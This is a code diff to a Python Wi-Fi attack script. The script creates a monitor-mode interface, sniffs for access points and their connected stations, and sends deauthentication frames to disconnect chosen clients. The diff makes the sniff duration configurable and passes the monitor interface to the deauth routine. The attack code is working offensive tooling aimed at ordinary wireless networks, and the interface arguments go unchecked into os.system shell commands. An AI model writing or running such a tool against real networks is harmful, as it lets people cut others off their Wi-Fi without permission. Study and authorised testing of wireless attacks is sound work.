@@ -35,27 +35,30 @@ if __name__ == "__main__":
         "--card_iface", help="Network card interface name from iwconfig ,default 'wlan1'", default='wlan1')
     parser.add_argument("--monitor_iface",
                         help="Desired monitor interface name ,default 'wlan0mon'", default='wlan0mon')
+    parser.add_argument(
+        "--sniff_time",
+        help="Amount of time each sniffing stage(find access points and find access point connected stations) should be executed ,default 60",
+        default=60)
 
     args = parser.parse_args()
     card_iface = args.card_iface
     monitor_iface = args.monitor_iface
+    sniff_time = args.sniff_time
 
     os.system(f"iw dev {card_iface} interface add {monitor_iface} type monitor")
     os.system(f"ifconfig {monitor_iface} up")
 
     # Find access points
-    ap_scan_time = 20
     scan_access_points_task = ScanAccessPoints(monitor_iface)
-    scan_access_points_task.sniffAction(ap_scan_time)
-    time.sleep(ap_scan_time)
+    scan_access_points_task.sniffAction(sniff_time)
+    time.sleep(sniff_time)
     ap_bssid = select_ap_bssid(scan_access_points_task.access_points)
 
     # Find connected stations of access point
-    targets_scan_time = 20
     find_ap_connected_stations_task = FindAccessPointConnectedStations(monitor_iface)
-    find_ap_connected_stations_task.sniffAction(ap_bssid, targets_scan_time)
-    time.sleep(targets_scan_time)
+    find_ap_connected_stations_task.sniffAction(ap_bssid, sniff_time)
+    time.sleep(sniff_time)
     response = select_bssids_for_deauth(find_ap_connected_stations_task.stations)
 
     # Execute deauth
-    deauth_client.deauth(response["target_bssid"], response["ap_bssid"])
+    deauth_client.deauth(response["target_bssid"], response["ap_bssid"], monitor_iface)
